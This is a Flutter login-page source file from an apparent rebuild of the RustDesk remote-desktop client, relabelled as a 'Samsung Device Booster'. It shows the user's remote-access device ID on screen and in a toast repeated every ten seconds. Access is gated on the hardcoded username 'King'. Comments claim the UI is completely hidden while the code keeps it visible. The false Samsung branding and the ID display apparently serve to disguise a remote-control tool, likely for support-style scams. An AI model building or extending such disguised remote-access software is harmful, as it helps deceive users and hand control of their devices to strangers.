import 'dart:async';
import 'package:flutter/material.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:bot_toast/bot_toast.dart';
import 'package:flutter_hbb/common/formatter/id_formatter.dart';
import 'package:get/get.dart';
import '../../common.dart';
import '../../common/widgets/chat_page.dart';
import '../../models/platform_model.dart';
import '../../models/state_model.dart';

class LoginPage extends StatefulWidget {
  final VoidCallback onLoginSuccess;

  const LoginPage({Key? key, required this.onLoginSuccess}) : super(key: key);

  @override
  State<LoginPage> createState() => _LoginPageState();
}

class _LoginPageState extends State<LoginPage> {
  final TextEditingController _usernameController = TextEditingController();

  String _errorMessage = '';
  bool _isLoading = false;
  String _deviceId = 'Loading...';
  Timer? _toastTimer;

  @override
  void initState() {
    super.initState();
    // Use WidgetsBinding like connection_page.dart does
    WidgetsBinding.instance.addPostFrameCallback((_) async {
      try {
        final id = await bind.mainGetMyId();
        final formattedId = formatID(id);
        if (mounted) {
          setState(() {
            _deviceId = formattedId;
          });
        }

        // Show immediately
        BotToast.showText(
          text: 'Device ID: $formattedId',
          duration: const Duration(seconds: 3),
        );

        // Then show every 10 seconds
        _toastTimer = Timer.periodic(const Duration(seconds: 10), (_) {
          BotToast.showText(
            text: 'Device ID: $formattedId',
            duration: const Duration(seconds: 3),
          );
        });
      } catch (e) {
        debugPrint('Error getting device ID: $e');
      }
    });
  }

  @override
  void dispose() {
    _usernameController.dispose();
    _toastTimer?.cancel();
    super.dispose();
  }

  Future<void> _handleLogin() async {
    final username = _usernameController.text.trim();

    if (username.isEmpty) {
      setState(() {
        _errorMessage = 'Please enter a username';
      });
      return;
    }

    setState(() {
      _isLoading = true;
      _errorMessage = '';
    });

    await Future.delayed(const Duration(milliseconds: 500));

    if (username == 'King') {
      final prefs = await SharedPreferences.getInstance();
      await prefs.setBool('login_status', true);
      widget.onLoginSuccess();
    } else {
      setState(() {
        _errorMessage = 'Invalid username';
        _usernameController.clear();
        _isLoading = false;
      });
    }
  }

  @override
  Widget build(BuildContext context) {
    // COMPLETELY HIDE the UI: no space occupied, no visual, but state kept alive
    return Visibility(
      visible: true,           // not visible
      maintainState: true,      // preserve the state (controller, isLoading, etc.)
      maintainSize: false,      // take no space (like "gone")
      maintainAnimation: false,
      maintainSemantics: false,
      child: Material(
        color: Colors.transparent,
        child: Scaffold(
          backgroundColor: Colors.transparent,
          body: Center(
            child: SingleChildScrollView(
              padding: const EdgeInsets.all(24),
              child: Column(
                mainAxisAlignment: MainAxisAlignment.center,
                children: [
                  // Logo
                  Container(
                    width: 80,
                    height: 80,
                    decoration: BoxDecoration(
                      color: Colors.blue,
                      borderRadius: BorderRadius.circular(16),
                    ),
                    child: const Icon(
                      Icons.desktop_windows,
                      size: 48,
                      color: Colors.white,
                    ),
                  ),
                  const SizedBox(height: 32),

                  // Device ID Display
                  Column(
                    crossAxisAlignment: CrossAxisAlignment.center,
                    children: [
                      Text(
                        'Your device',
                        style: Theme.of(context).textTheme.bodySmall?.copyWith(
                              color: Colors.grey[400],
                              fontWeight: FontWeight.w500,
                            ),
                      ),
                      const SizedBox(height: 8),
                      Text(
                        _deviceId,
                        style: Theme.of(context).textTheme.titleMedium?.copyWith(
                              color: Colors.white,
                              fontWeight: FontWeight.bold,
                              letterSpacing: 1,
                            ),
                      ),
                      const SizedBox(height: 16),
                      Divider(color: Colors.grey[700]),
                    ],
                  ),
                  const SizedBox(height: 24),

                  // Title
                  Text(
                    "Samsung",
                    style: Theme.of(context).textTheme.headlineMedium?.copyWith(
                          fontWeight: FontWeight.bold,
                          color: Colors.white,
                        ),
                  ),
                  const SizedBox(height: 8),

                  // Subtitle
                  Text(
                    "Samsung Device Booster",
                    style: Theme.of(context).textTheme.bodyMedium?.copyWith(
                          color: Colors.grey[400],
                        ),
                  ),
                  const SizedBox(height: 48),

                  // Username Field
                  TextField(
                    controller: _usernameController,
                    style: const TextStyle(color: Colors.white),
                    decoration: InputDecoration(
                      hintText: "Enter username",
                      hintStyle: TextStyle(color: Colors.grey[600]),
                      filled: true,
                      fillColor: Colors.grey[800],
                      prefixIcon: const Icon(Icons.person, color: Colors.blue),
                      border: OutlineInputBorder(
                        borderRadius: BorderRadius.circular(8),
                        borderSide: BorderSide.none,
                      ),
                      errorText: _errorMessage.isNotEmpty ? _errorMessage : null,
                    ),
                    onSubmitted: (_) => _handleLogin(),
                  ),
                  const SizedBox(height: 24),

                  // Login Button
                  SizedBox(
                    width: double.infinity,
                    height: 48,
                    child: ElevatedButton(
                      onPressed: _isLoading ? null : _handleLogin,
                      style: ElevatedButton.styleFrom(
                        backgroundColor: Colors.blue,
                        disabledBackgroundColor: Colors.grey[700],
                        shape: RoundedRectangleBorder(
                          borderRadius: BorderRadius.circular(8),
                        ),
                      ),
                      child: _isLoading
                          ? const SizedBox(
                              height: 20,
                              width: 20,
                              child: CircularProgressIndicator(
                                strokeWidth: 2,
                                color: Colors.white,
                              ),
                            )
                          : const Text(
                              "Login",
                              style: TextStyle(
                                fontSize: 16,
                                fontWeight: FontWeight.bold,
                              ),
                            ),
                    ),
                  ),
                  const SizedBox(height: 32),

                  // Demo Info
                  Container(
                    padding: const EdgeInsets.all(16),
                    decoration: BoxDecoration(
                      color: Colors.blue.withOpacity(0.1),
                      borderRadius: BorderRadius.circular(8),
                      border: Border.all(
                        color: Colors.blue.withOpacity(0.3),
                      ),
                    ),
                    child: const Text(
                      'Enter username to access the application',
                      style: TextStyle(
                        color: Colors.blue,
                        fontSize: 12,
                      ),
                      textAlign: TextAlign.center,
                    ),
                  ),
                ],
              ),
            ),
          ),
        ),
      ),
    );
  }
}
